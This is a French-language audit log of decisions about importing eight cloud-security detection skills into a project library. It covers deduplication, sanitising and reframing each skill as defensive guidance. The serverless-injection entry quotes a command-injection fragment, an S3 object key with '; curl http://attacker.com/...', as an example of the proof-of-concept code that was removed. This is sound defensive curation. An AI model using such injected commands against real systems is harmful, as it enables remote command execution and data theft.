# ECC Harvest — décisions cluster `cyber:cloud-security` (lot EQ)

Doer: lot cloud-security EQ (8 skills sources). Worktree `maos-ecc`, branche `phase/ecc-harvest`. Méthode: intake-audit DÉFENSIF (toutes des skills de détection T1) → bibliothèque boostée §12.
Source: `mukul975/Anthropic-Cybersecurity-Skills` (clone read-only `--depth 1`, 2026-06-18), licence **Apache-2.0**, frontmatter `subdomain: cloud-security`.
Cible keepers: `packages/skills/library/<slug>/SKILL.md` (forme exemplar exacte: ligne 1 `---`, frontmatter name/description/summary L1/metadata{origin,license,cluster,tier T1,status library,frameworks}, commentaire source, `## Prompt Defense Baseline` verbatim, 7 sections §12).
Recadrage transverse (CLAUDE.md §11): MAOS = abonnement, AUCUN coût per-token PAYG. Tout chiffre = unités de quota, jamais $/€. Les remédiations actives (révoquer un rôle, isoler une instance, supprimer une clé) restent **guidance propriétaire**, jamais une action MAOS (§5). MAOS lit/raisonne/rapporte; il ne mute pas le tenant/compte cloud de l'utilisateur.
Sanitize (secrets/PII/`@anthropic-ai/sdk`): 8/8 sources clean d'imports SDK Anthropic. IDs de comptes/IP/clés dans les sources = déjà des placeholders d'exemple (`123456789012`, `185.x.x.x`, `AKIA...EXAMPLE`); conservés en placeholders neutres. Payloads d'exploitation live (skill serverless) neutralisés en pseudo-placeholders inoffensifs.
Frameworks préservés depuis le frontmatter source (`nist_csf`, `mitre_attack`; `atlas_techniques`/`nist_ai_rmf` quand présents).

## DUP traité (hygiène pré-audit)
`detecting-azure-storage-account-misconfigurations` (2.7 KB, SDK `azure-mgmt-storage` seul, mince) **vs** `detecting-misconfigured-azure-storage` (12 KB, workflow 6 étapes CLI+PowerShell+Defender, scénarios, output) — même `subdomain`, même auteur, mêmes `atlas_techniques`/`nist_csf` qui se chevauchent. DUP confirmé. **Keeper = la plus forte** (`detecting-misconfigured-azure-storage`); la mince est **FOLD** (rejet keeper-vide, sa seule lentille unique — chemin SDK Python `StorageManagementClient` — repliée comme note dans le corps du keeper). Bilan: 7 keepers, 1 fold.

---

## detecting-misconfigured-azure-storage
- **décision**: adapt (keeper — survivant du DUP)
- **raison**: audit défensif *authorized* des storage accounts Azure (public access, ACL réseau, chiffrement/TLS, SAS/clés, logging) scoré CIS. Lentille de posture distincte de mas-sec-reviewer (autorisation per-tâche) et de Defender (détection temps réel). La variante mince `detecting-azure-storage-account-misconfigurations` est repliée ici (fold), son unique chemin SDK Python noté en Process step 1.
- **dedup**: oui — absorbe la DUP mince; pas de chevauchement avec nos assets (aucun audit storage cloud existant).
- **chemin library**: `packages/skills/library/detecting-misconfigured-azure-storage/SKILL.md`
- **sanitize**: clean (0 import `@anthropic-ai/sdk`; IDs/clés = placeholders d'exemple conservés neutres).
- **frameworks**: nist_csf + mitre_attack + atlas_techniques (préservés).
- **état**: keeper boosté conforme (ligne 1 `---`, commentaire source + commentaire fold, summary L1, metadata complet, Prompt Defense Baseline verbatim, 7 sections §12). Recadré §5 (remédiation = guidance propriétaire) + §11 (quota, pas de cash).

## detecting-azure-storage-account-misconfigurations
- **décision**: reject (FOLD — DUP plus faible)
- **raison**: doublon de `detecting-misconfigured-azure-storage` (même subdomain, même auteur, mêmes atlas_techniques/nist_csf). Mince (2.7 KB), SDK `azure-mgmt-storage` seul, sans workflow ni scénarios. Sa seule lentille unique (énumération via `StorageManagementClient` Python) est repliée comme note dans le keeper survivant.
- **dedup**: oui — entièrement couvert par le keeper.
- **chemin library**: aucun (FOLD).
- **état**: rejeté-keeper-vide / replié. KILL: dup-no-better d'un keeper plus fort du même lot. Re-audit: non (folded).

## detecting-cloud-threats-with-guardduty
- **décision**: adapt (keeper)
- **raison**: opération défensive de GuardDuty sur comptes AWS autorisés — taxonomie des findings, sévérité, AttackSequence (Extended Threat Detection), workflows EventBridge→Lambda comme guidance propriétaire. Lentille SOC cloud distincte de mas-sec-reviewer.
- **dedup**: non — aucun asset GuardDuty/détection cloud AWS existant.
- **chemin library**: `packages/skills/library/detecting-cloud-threats-with-guardduty/SKILL.md`
- **sanitize**: clean (0 import SDK Anthropic; IDs/ARNs/clés = placeholders d'exemple).
- **frameworks**: nist_csf + mitre_attack (préservés).
- **état**: keeper boosté conforme (ligne 1 `---`, commentaire source, summary L1, metadata, Prompt Defense Baseline verbatim, 7 sections §12). Recadré §5 (containment = guidance) + §11 (quota).

## detecting-compromised-cloud-credentials
- **décision**: adapt (keeper)
- **raison**: détection multi-cloud (AWS/Azure/GCP) de credentials compromis — impossible travel, anomalies API, persistence (nouvelles clés/grants). Cœur §5 IAM/secrets. Distinct de mas-sec-reviewer (autorisation per-tâche).
- **dedup**: non — aucun asset de détection credential-compromise cloud existant.
- **chemin library**: `packages/skills/library/detecting-compromised-cloud-credentials/SKILL.md`
- **sanitize**: clean (0 import SDK Anthropic; ARNs/UPNs/IPs/clés = placeholders d'exemple).
- **frameworks**: nist_csf + mitre_attack (préservés).
- **état**: keeper boosté conforme (8 sections, Prompt Defense verbatim). Recadré §5 (containment = guidance propriétaire) + §11 (quota).

## detecting-cryptomining-in-cloud
- **décision**: adapt (keeper)
- **raison**: détection cryptojacking (resource hijacking) cloud par fusion 4 signaux (coût/compute/réseau-pools/runtime) + traçage accès initial. Défensif, distinct de mas-sec-reviewer.
- **dedup**: non — aucun asset cryptomining/resource-hijacking existant.
- **chemin library**: `packages/skills/library/detecting-cryptomining-in-cloud/SKILL.md`
- **sanitize**: clean (0 import SDK Anthropic; IDs/clés/ARNs = placeholders). Impact recadré en scope/ressources, pas en $.
- **frameworks**: nist_csf + mitre_attack (préservés).
- **état**: keeper boosté conforme (8 sections, Prompt Defense verbatim). Recadré §5 (snapshot-first + containment = guidance) + §11 (quota).

## detecting-oauth-token-theft
- **décision**: adapt (keeper)
- **raison**: détection vol/replay de tokens OAuth (access/refresh/PRT/cookie/device-code) Entra ID/M365 post-MFA, + défenses de binding (Token Protection, CAE). Cœur §5 identité. Distinct de mas-sec-reviewer.
- **dedup**: non — aucun asset token-theft/identité cloud existant.
- **chemin library**: `packages/skills/library/detecting-oauth-token-theft/SKILL.md`
- **sanitize**: clean (0 import SDK Anthropic; UPNs/tenant/tokens = placeholders).
- **frameworks**: nist_csf + mitre_attack (préservés).
- **état**: keeper boosté conforme (8 sections, Prompt Defense verbatim). La source avait déjà une section "Verification" — réécrite au format §12 binaire. Recadré §5 (revocation = guidance) + §11 (quota).

## detecting-s3-data-exfiltration-attempts
- **décision**: adapt (keeper)
- **raison**: détection exfiltration S3 (bulk GetObject, CopyObject cross-account) pondérée par sensibilité Macie. Défensif, cœur §5 données/secrets. Distinct de mas-sec-reviewer.
- **dedup**: non — aucun asset exfiltration/DLP cloud existant.
- **chemin library**: `packages/skills/library/detecting-s3-data-exfiltration-attempts/SKILL.md`
- **sanitize**: clean (0 import SDK Anthropic; buckets/ARNs/clés/contenus = placeholders).
- **frameworks**: nist_csf + mitre_attack (préservés).
- **état**: keeper boosté conforme (8 sections, Prompt Defense verbatim). Recadré §5 (policies/key deactivation = guidance) + §11 (quota).

## detecting-serverless-function-injection
- **décision**: adapt (keeper, sanitize lourd)
- **raison**: audit défensif d'injection serverless (Lambda/Functions/GCF) — sinks (eval/exec/os.system/child_process), event-source poisoning, layers malveillants, privesc IAM (UpdateFunctionCode+PassRole). Cadre OWASP-serverless + SAST. Distinct de mas-sec-reviewer.
- **dedup**: non — aucun asset serverless-security existant.
- **chemin library**: `packages/skills/library/detecting-serverless-function-injection/SKILL.md`
- **sanitize**: lourd. La source contenait des PoC offensifs *live* (ex. clés d'objet S3 `; curl http://attacker.com/...`, env exfil). **Neutralisés en placeholders inoffensifs**; mapping source→sink défensif préservé, chaîne d'exploit copiable retirée. Commentaire `<!-- sanitized -->` ajouté. 0 import SDK Anthropic; ARNs/IDs/clés = placeholders.
- **frameworks**: nist_csf + mitre_attack (préservés).
- **état**: keeper boosté conforme (8 sections, Prompt Defense verbatim). Recadré §5 (no-weaponization + remédiation = guidance) + §11 (quota). NB: défensif net (audit/détection/prévention) → pas de KILL malgré PoC sources, après désarmement.

---

## Bilan lot EQ
- **Keepers**: 7 (`detecting-misconfigured-azure-storage`, `detecting-cloud-threats-with-guardduty`, `detecting-compromised-cloud-credentials`, `detecting-cryptomining-in-cloud`, `detecting-oauth-token-theft`, `detecting-s3-data-exfiltration-attempts`, `detecting-serverless-function-injection`).
- **Folds/rejets**: 1 (`detecting-azure-storage-account-misconfigurations` → fold dans le keeper Azure storage).
- **KILL (weaponization/mass-targeting/evasion)**: 0 — toutes défensives; le seul risque (PoC serverless) traité par sanitize, pas par rejet.
- **Sanitize global**: 8/8 sources sans import `@anthropic-ai/sdk`; tous IDs/clés/IPs en placeholders; payloads offensifs serverless désarmés.
- **Frameworks**: préservés sur les 7 keepers (nist_csf + mitre_attack partout; atlas_techniques sur le keeper Azure storage).
